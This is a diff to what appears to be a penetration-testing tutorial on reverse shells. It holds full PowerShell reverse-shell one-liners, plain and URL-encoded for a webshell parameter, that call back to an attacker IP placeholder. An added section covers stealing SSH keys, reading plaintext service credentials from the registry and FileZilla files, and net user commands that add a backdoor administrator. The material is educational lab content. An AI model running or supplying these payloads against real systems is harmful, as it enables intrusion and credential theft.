@@ -411,7 +411,7 @@ We can similarly send a Netcat reverse shell:
 When targeting a modern Windows Server, we would require a Powershell reverse shell. The standard syntax is
 
 ```powershell
-powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
 replacing \<IP> with the attacker's IP address and \<PORT> with the appropriate port.
@@ -544,7 +544,26 @@ There are a variety of webshells available on Kali Linux by default at `/usr/sha
 When the target is Windows, it is often easiest to obtain RCE using a webshell, or by using msfvenom to generate a reverse/bind shell in the language of the server. With the former, obtaining RCE is often done using a URL encoded Powershell reverse shell. This would be copied into the URL as the `cmd` argument: 
 
 ```powershell
-powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
+> powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
 ```
 
 This is the same as the Powershell reverse shell discussed [earlier](#for-windows-powershell), but URL encoded to be used safely as a `GET` parameter. As before, the IP address (`<IP>`) and port number (`<PORT>`) need to be changed. 
+
+## Next steps
+
+We have seen many different ways to generate, send and receive shells. However, shells tend to be unstable and non-interactive. Even stablised shells are not ideal. What would our next steps be? 
+
+On Linux, ideally we would be looking to gain access to a user account. SSH keys stored at `/home/<USER>/.ssh` are often a good way to do this. Some exploits will even allow us to *add our own account*. In particular, something like [Dirty C0w](https://dirtycow.ninja/) or a **writable** `/etc/shadow` or `/etc/passwd` would quickly give us SSH access to the machine, assuming that SSH is open. 
+
+On Windows, the options are more limited. It is sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the **registry stored in plaintext**. Some versions of the *FileZilla* FTP server also leave credentials (in MD5 hashes or plaintext, depending on the version) in an XML file at `C:\Program Files\FileZilla Server\FileZilla Server.xml` or `C:\xampp\FileZilla Server\FileZilla Server.xml`.
+
+Ideally on Windows, we would obtain a shell as the SYSTEM user, or an administrator account running high privileges. Then, we can simply add our own account (into the administrators group) to the machine, and then log in via methods such as RDP, telnet, winexe, etc. The powershell syntax to add a user is: 
+
+```powershell
+> net user <username> <password> /add
+> net localgroup administrators <username> /add
+```
+
+The key takeaway is this: 
+> Reverse and bind shells are an essential technique for gaining remote code execution on a machine. However, they will never be as fully featured as a native shell. Ideally, we always want to escalate into using a "normal" method for accessing the machine, as this will invariably be easier to use for further exploitable of the target.
+
